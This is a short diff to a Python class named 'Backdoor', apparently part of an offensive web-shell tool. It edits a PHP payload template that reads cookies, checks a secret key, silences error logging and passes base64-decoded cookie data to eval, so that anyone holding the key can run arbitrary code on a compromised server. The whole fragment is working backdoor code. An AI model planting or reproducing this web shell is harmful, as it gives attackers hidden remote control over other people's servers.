@@ -35,7 +35,7 @@ class Backdoor:
 	payload_template= """
 $a=$_COOKIE;if(reset($a)=='%%%START_KEY%%%' && count($a)>3){ini_set('error_log', '/dev/null');
 echo '<%%%END_KEY%%%>';
-eval(base64_decode(preg_replace(array('/[^\w+\ =]/', '/\ /'), array('', '+'), join(array_slice($a,count($a)-3)))));
+eval(base64_decode(preg_replace('/[^\w=]/', '', join(array_slice($a,count($a)-3)))));
 echo '</%%%END_KEY%%%>';
 }
 """
